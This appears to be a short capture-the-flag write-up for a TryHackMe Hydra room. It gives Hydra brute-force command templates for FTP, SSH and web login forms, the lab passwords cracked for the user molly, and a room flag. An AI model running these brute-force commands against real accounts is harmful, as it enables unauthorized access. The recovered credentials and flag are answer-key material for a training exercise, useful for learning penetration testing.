# Hydra-ha-ha-haa

```
compromising a/c by bruteforcing
```

## Notes

```
export IP=10.10.92.194

hydra -l user -P passlist.txt ftp://192.168.0.1

For SSH:
hydra -l <username> -P <full path to pass> <ip> -t 4 ssh

For WEB:
hydra -l <username> -P <password list> <ip> http-post-form "/<login url>:username=^USER^&password=^PASS^:F=incorrect" -V


```

## Questions

1. Use Hydra to bruteforce molly's web password. What is flag 1? (The flag is mistyped, its THM, not TMH)

```
hydra -l molly -P /media/nikesh/HDD/Security/wordlist/rockyou.txt 10.10.92.194 http-post-form "/login:username=^USER^&password=^PASS^:F=Your username or password is incorrect." -V -f
molly:joyness1994

```

2. Use Hydra to bruteforce molly's SSH password. What is flag 2?

```
hydra -l molly -P <full path to pass> <ip> -t 4 ssh -f
molly:butterfly

THM{c8eeb0468febbadea859baeb33b2541b}
```
